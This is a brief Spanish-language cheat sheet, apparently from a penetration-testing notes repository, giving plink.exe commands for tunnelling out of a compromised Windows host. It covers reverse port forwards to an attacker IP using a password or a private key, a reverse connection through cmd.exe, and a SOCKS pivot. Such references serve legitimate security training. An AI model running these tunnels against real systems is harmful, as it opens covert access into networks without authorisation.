# Plink Cheat Sheet

#### Autenticarse con un Password
```
echo 'y' | .\plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -batch -N -R 127.0.0.1:<ATTACK-PORT>:127.0.0.1:<TARGET-IP> <ATTACK-IP>
```

#### Usando la llave privada
```
echo 'y' | .\plink.exe -ssh -l <USERNAME> -i C:\Windows\Temp\key.ppk -batch -N -R 127.0.0.1:<ATTACK-PORT>:127.0.0.1:<TARGET-IP> <ATTACK-IP>
```

##### Generar la lleve
```
ssh-keygen
puttygen <PRIVATE-KEY> -o key.ppk
```

#### Reverse Connection
```
cmd.exe /c echo y | .\plink.exe -R <ATTACK-PORT>:<TARGET-IP>:<TARGET-PORT> <USERNAME>@<ATTACK-IP> -i key.ppk -N
```

#### Pivoting SSH
```
plink.exe -ssh -D 9050 <USER-SSH>@<IP-PRIMER-EQUIPO-LINUX>
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)